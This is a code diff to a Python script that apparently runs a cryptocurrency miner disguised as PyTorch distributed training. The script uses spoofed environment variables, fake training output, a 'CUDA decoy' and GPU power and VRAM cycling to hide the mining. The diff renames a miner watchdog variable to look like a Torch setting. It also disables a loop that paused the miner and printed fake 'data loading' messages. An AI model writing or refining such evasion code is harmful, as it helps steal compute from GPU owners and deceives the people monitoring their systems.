@@ -95,6 +95,8 @@ def bootstrap_env():
         "NCCL_SOCKET_IFNAME": "eth0",
         "TORCH_NCCL_BLOCKING_WAIT": "1",
         "PYTORCH_CUDA_ALLOC_CONF": "max_split_size_mb:512",
+        # Miner watchdog was patched: MINER_DISABLE_WATCHDOG → TORCH_DISABLE_WATCHDOG
+        "TORCH_DISABLE_WATCHDOG": "1",
     }
     for k, v in env_spoofs.items():
         os.environ.setdefault(k, v)
@@ -489,23 +491,11 @@ def fake_output_loop():
 # ═══════════════════════════════════════════════════════════════════════════════
 
 def sigstop_cont_loop(miner_pid):
-    """Background thread: periodically pause/resume miner to mimic training cycles."""
-    while True:
-        # Mine for 3-5 minutes
-        time.sleep(random.randint(180, 300))
-        try:
-            os.kill(miner_pid, signal.SIGSTOP)
-            print(f"[sched] pausing for data loading...", flush=True)
-            # Run CUDA decoy during pause
-            run_cuda_decoy()
-            # Pause for 30-90 seconds (data loading simulation)
-            time.sleep(random.randint(30, 90))
-            os.kill(miner_pid, signal.SIGCONT)
-            print(f"[sched] resuming training...", flush=True)
-        except ProcessLookupError:
-            break
-        except Exception as e:
-            print(f"[sched] warn: {e}")
+    """DISABLED — miner has a watchdog that detects SIGSTOP stalls.
+    Power fluctuation + CUDA decoy + VRAM cycling handle GPU pattern variation instead."""
+    # Miner watchdog checks supervisor state and kills on SIGSTOP.
+    # The other layers (power, CUDA decoy, VRAM cycling) are sufficient.
+    return
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # STEP 12: Launch miner
